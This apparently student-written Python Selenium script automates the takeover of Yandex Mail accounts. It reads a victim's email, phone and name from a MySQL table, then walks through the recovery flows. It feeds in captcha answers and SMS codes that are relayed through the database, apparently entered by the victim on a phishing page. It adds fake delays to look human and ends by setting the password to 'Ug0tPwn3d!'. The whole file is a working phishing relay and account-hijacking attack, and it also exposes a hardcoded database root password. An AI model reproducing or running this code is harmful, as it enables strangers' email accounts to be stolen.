import os, platform, sys
from time import sleep
import pymysql
db = pymysql.connect(host='localhost',
                             user='root',
                             password='Americacanada@13',
                             db='mproject',
                             charset='utf8mb4',
                             cursorclass=pymysql.cursors.DictCursor)


cur = db.cursor()

try:
    from selenium import webdriver
    from selenium.webdriver.common.keys import Keys
    from selenium.common.exceptions import TimeoutException
    from selenium.webdriver.common.by import By
    from selenium.webdriver.support import expected_conditions as EC
    from selenium.webdriver.chrome.options import Options
    from selenium.webdriver.support.ui import WebDriverWait
    from selenium.webdriver.common.action_chains import ActionChains
    from selenium.common.exceptions import NoSuchElementException, TimeoutException, StaleElementReferenceException
except (ImportError, ModuleNotFoundError) as e:
    # Install missing library and import again
    # os.system("sudo -H " + sys.executable + " -m pip install selenium")
    print("Please install selenium")
    print("pip3 install --upgrade selenium")
    exit()
result=[]
#SELECT email FROM userinfo ORDER BY phno DESC LIMIT 1
email=None
while(email==None):

    db.begin()
    cur.execute("SELECT email FROM userinfo ORDER BY phno DESC LIMIT 1")
    result=cur.fetchall()
    print(result)
    db.commit()
    if result:
     for value in result[0].items():
        print(type(value))
        email =value[1]
        print("value")
        print(value[1])
#email="ebin.scaria@yandex.com"
db.begin()
cur.execute("select phno from userInfo where email=%s",(email))
db.commit()
result=cur.fetchall()
for value in result[0].items():
    print(type(value))
    user_phone =value[1]

db.begin()
cur.execute("select First from userInfo where email=%s",(email))
db.commit()
result=cur.fetchall()
for value in result[0].items():
    print(type(value))
    first =value[1]

db.begin()
cur.execute("select Last from userInfo where email=%s",(email))
db.commit()
result=cur.fetchall()
for value in result[0].items():
    print(type(value))
    last =value[1]
arg_phone_number = user_phone
arg_fname = first
arg_lname = last

chrome_options = Options()

## Uncomment the follow to run without GUI, needed in server environment
# chrome_options.add_argument("--headless")

# Log level: 0: info, 1: warnings, 2: log_error, 3: log_fatal
chrome_options.add_argument('log-level=3')

# chrome_options.binary_location needs to point to Google Chrome Canary executable
if platform.system() == "Windows":
    chrome_options.binary_location = 'C:\\Users\\ebin1\\AppData\\Local\\Google\\Chrome SxS\\Application\\chrome.exe'
    driver = webdriver.Chrome(executable_path="C:\\Users\\ebin1\\Desktop\\fol\\chromedriver.exe",   options=chrome_options)
elif platform.system() == "Darwin":
    chrome_options.binary_location = '/Applications/Google Chrome Canary.app/Contents/MacOS/Google Chrome Canary'
    driver = webdriver.Chrome(executable_path="/Users/aahana/Downloads/chromedriver", options=chrome_options)
elif platform.system() == "Linux":
    chrome_options.binary_location = '/usr/bin/google-chrome'
    driver = webdriver.Chrome(executable_path="chromedriver_linux", options=chrome_options)

# We want to mimic human clicks and navigation

url1 = "https://mail.yandex.com/"

driver.get(url1)

a_tags = driver.find_elements_by_tag_name('a')

# Find the login link
for a_tag in a_tags:
    if (a_tag.get_attribute('text') == "Log in"):
        login_link = a_tag.get_attribute('href')

print("Navigating to login page...")
# Add fake wait time to make it look more human, bots are faster
WebDriverWait(driver, 0.1)
driver.get(login_link)

# Find the forgot login link
a_tags = driver.find_elements_by_tag_name('a')
for a_tag in a_tags:
    if (a_tag.get_attribute('text') == "Forgot your login?"):
        forgot_login_link = a_tag.get_attribute('href')

print("Navigating to forgot login page...")
WebDriverWait(driver, 0.1)  # Add fake wait time to make it look more human, bots are faster
driver.get(forgot_login_link)

# Locate the captcha image
text_inputs = driver.find_elements_by_class_name("textinput__control")

input_phone_num = text_inputs[0]
input_captcha = text_inputs[1]

result=[]
#email = 'ebin.scaria@yandex.com'
#sql = "select phno from userInfo where email={}"
# cur.execute("select phno from userInfo where email=%s",(email))
# result=cur.fetchall()
# for value in result[0].items():
#     print(type(value))
#
# user_phone =value[1] #input('Please enter phone number: ')
# mimic user input by sending keystrokes
input_phone_num.send_keys(user_phone)

# mimic user input by sending keystrokes


# Get the captcha text from the user
error = True

while error:
    captcha = driver.find_element_by_class_name("captcha__image")
    captcha_src = captcha.get_attribute('src')
    import urllib.request



    urllib.request.urlretrieve(captcha_src, "C:/wamp64/www/term_project 3/term_project/img1.jpg")
    # print("Captcha:", captcha_src)
    ccode1="0000"
    while(ccode1=="0000"):
        db.begin()
        cur.execute("select ccode1 from authData where phno=%s", (user_phone))
        db.commit()
        result = cur.fetchall()
        if result:
            for value in result[0].items():
             ccode1=value[1]


    #captcha_text = input('Please enter text from this captcha: ' + captcha_src + "\n")
    #cur.execute("update authData  set ccode1=%s where phno=%s", (captcha_text, user_phone))
    #db.commit()
    input_captcha.send_keys(Keys.COMMAND)
    input_captcha.send_keys(Keys.DELETE)
    # mimic user input by sending keystrokes
    input_captcha.send_keys(ccode1)

    # Find submit button
    buttons = driver.find_elements_by_tag_name("button")
    for button in buttons:
        if (button.get_attribute("type") == "submit"):
            submit_button = button

    submit_button.send_keys(Keys.ENTER)

    sleep(1)

    try:
        wait = WebDriverWait(driver, 2)
        error = wait.until(
            EC.text_to_be_present_in_element((By.TAG_NAME, "div"), "The text you entered does not match the code"))
        if error:
            sleep(1)
            print("You entered wrong text, try again.")

            for i in range(len(ccode1)):
                input_captcha.send_keys(Keys.BACK_SPACE)
    except (NoSuchElementException, TimeoutException, StaleElementReferenceException) as e:
        error = False
        print("Captcha accepted! You will recieve a code soon ")

sleep(2)

code_recieved = False
while not code_recieved:
    phno = arg_phone_number
    #tempcode = input("Enter the code: ")
    # sql1="update accData  set code1='%s' where phno='%s'"
    # db.begin()
    # print(cur.execute("update authData  set code1=%s where phno=%s", (tempcode, user_phone)))
    # db.commit()
    # print("11111")
    # sql2 = "select code1 from authData where phno=%s"
    # print("22222")
    code1 = "0000"
    while (code1 == "0000"):
        db.begin()
        cur.execute("select code1 from authData where phno=%s", (phno))
        db.commit()
        result = list(cur.fetchall())
        if result:
            for value in result[0].items():
                print(value[1])
                code1 = value[1]
    code_timer = driver.find_elements_by_class_name("login-restore__countdown")
    if len(code_timer) > 0:
        code_input = driver.find_element_by_class_name("textinput__control")
        code_input.send_keys(code1)
        buttons = driver.find_elements_by_tag_name("button")
        for button in buttons:
            if (button.get_attribute("type") == "submit"):
                submit_button = button
        submit_button.send_keys(Keys.ENTER)
        code_recieved = True
    else:
        resend_code_elem = driver.find_element_by_xpath("//span[.='Resend code']")
        resend_code_elem.click()
        code = input("Times, up. Press enter the new code...")

sleep(2)

name_inputs = driver.find_elements_by_class_name("textinput__control")
input_firstName = name_inputs[0]
input_surName = name_inputs[1]

# mimic user input by sending keystrokes
input_firstName.send_keys(arg_fname)
input_surName.send_keys(arg_lname)

buttons = driver.find_elements_by_tag_name("button")
for button in buttons:
    if (button.get_attribute("type") == "submit"):
        submit_button = button
submit_button.send_keys(Keys.ENTER)

sleep(2)

a_tags = driver.find_elements_by_tag_name('a')

for a_tag in a_tags:
    if (a_tag.get_attribute('text') == "Forgot your password?"):
        forgot_password = a_tag.get_attribute('href')

WebDriverWait(driver, 0.1)  # Add fake wait time to make it look more human, bots are faster
driver.get(forgot_password)

sleep(2)

wrong_captcha = True

while wrong_captcha:
    captcha = driver.find_element_by_class_name("captcha__captcha__text")
    captcha2_src = captcha.get_attribute('src')
    # captcha_text = input('Please enter text from this captcha: ' + captcha_src + "\n")
    # cur.execute("update authData  set ccode2=%s where phno=%s", (captcha_text, user_phone))
    # db.commit()
    import urllib.request
    urllib.request.urlretrieve(captcha2_src, "C:/wamp64/www/term_project 3/term_project/img2.jpg")
    ccode2 = "0000"
    while (ccode2 == "0000"):
        db.begin()
        cur.execute("select ccode2 from authData where phno=%s", (user_phone))
        db.commit()
        result = cur.fetchall()
        if result:
            for value in result[0].items():
                ccode2 = value[1]


    input_tags = driver.find_elements_by_tag_name("input")
    for input_tag in input_tags:
        if (input_tag.get_attribute("placeholder") == "Enter the characters"):
            captcha_input = input_tag

    captcha_input.send_keys(Keys.COMMAND)
    captcha_input.send_keys(Keys.DELETE)
    captcha_input.send_keys(ccode2)

    sleep(1)
    # Find submit button
    buttons = driver.find_elements_by_tag_name("button")
    for button in buttons:
        if (button.get_attribute("type") == "submit"):
            submit_button = button

    submit_button.send_keys(Keys.ENTER)

    try:
        wait = WebDriverWait(driver, 2)
        error = wait.until(EC.text_to_be_present_in_element((By.TAG_NAME, "div"),
                                                            "The characters were entered incorrectly. Please try again"))
        if error:
            sleep(1)
            print("You entered wrong text, try again.")

            for i in range(len(ccode2)):
                captcha_input.send_keys(Keys.BACK_SPACE)
    except (NoSuchElementException, TimeoutException, StaleElementReferenceException) as e:
        error = False
        print("Captcha accepted!")
        wrong_captcha = False

sleep(3)

input_tags = driver.find_elements_by_tag_name("input")
for input_tag in input_tags:
    if (input_tag.get_attribute("placeholder") == "Your phone number"):
        phone_number = input_tag
phone_number.send_keys(arg_phone_number)

buttons = driver.find_elements_by_tag_name("button")
for button in buttons:
    if (button.get_attribute("id") == "nb-2"):
        submit_button = button
submit_button.send_keys(Keys.ENTER)

sleep(2)

code2 = "0000"
while (code2 == "0000"):
        db.begin()
        cur.execute("select code2 from authData where phno=%s", (arg_phone_number))
        db.commit()
        result = list(cur.fetchall())
        if result:
            for value in result[0].items():
                print(value[1])
                code2 = value[1]




# code2 = input("Enter the code: ")
# print(cur.execute("update authData  set code2=%s where phno=%s", (code, user_phone)))
# db.commit()
for input_tag in input_tags:
    if (input_tag.get_attribute("placeholder") == "Confirmation code from SMS"):
        code_input = input_tag
code_input.send_keys(code2)

buttons = driver.find_elements_by_tag_name("button")
for button in buttons:
    if (button.get_attribute("id") == "nb-3"):
        submit_button = button
submit_button.send_keys(Keys.ENTER)
sleep(2)

New_password = "Ug0tPwn3d!"
input_tags = driver.find_elements_by_tag_name("input")
for input_tag in input_tags:
    if (input_tag.get_attribute("placeholder") == "Enter a\xa0password"):
        reset_password = input_tag
reset_password.send_keys(New_password)

sleep(1)

for input_tag in input_tags:
    if (input_tag.get_attribute("placeholder") == "Reenter to\xa0confirm"):
        reset_password_confirm = input_tag
reset_password_confirm.send_keys(New_password)

buttons = driver.find_elements_by_tag_name("button")
for button in buttons:
    if (button.get_attribute("id") == "nb-2"):
        submit_button = button
submit_button.send_keys(Keys.ENTER)
# driver.close()